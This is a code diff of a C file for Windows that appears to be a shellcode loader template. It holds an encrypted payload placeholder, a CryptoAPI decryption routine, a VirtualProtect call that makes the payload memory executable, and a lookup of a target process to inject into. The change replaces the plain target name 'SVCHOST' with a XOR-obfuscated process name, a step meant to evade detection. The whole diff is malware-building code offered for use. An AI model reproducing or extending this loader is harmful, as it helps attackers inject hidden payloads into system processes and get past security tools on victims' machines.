@@ -1,3 +1,6 @@
+
+
+
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -12,7 +15,8 @@ LPVOID (WINAPI * Virt_Alloc)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocat
 
 char XOR_VARIABLE []= "XOR_KEY";
 
-unsigned char fRandom6 []= VIRALO}; 
+unsigned char fRandom6 []=VIRALO}; 
+unsigned char Random9[]=PROCY};
 
 int aRandom1(char * eRandom5, unsigned int eRandom5_len, char * key, size_t keylen) {
         HCRYPTPROV hProv;
@@ -139,8 +143,9 @@ int main(void) {
 	
 	rv = VirtualProtect(Random8_mem, eRandom5_len, PAGE_EXECUTE_READ, &oldprotect);
 
-
-	pid = bRandom2("SVCHOST");
+	gRandom7((char *) Random9, sizeof (Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));
+	
+	pid = bRandom2(Random9);
 
 	if (pid) {
 
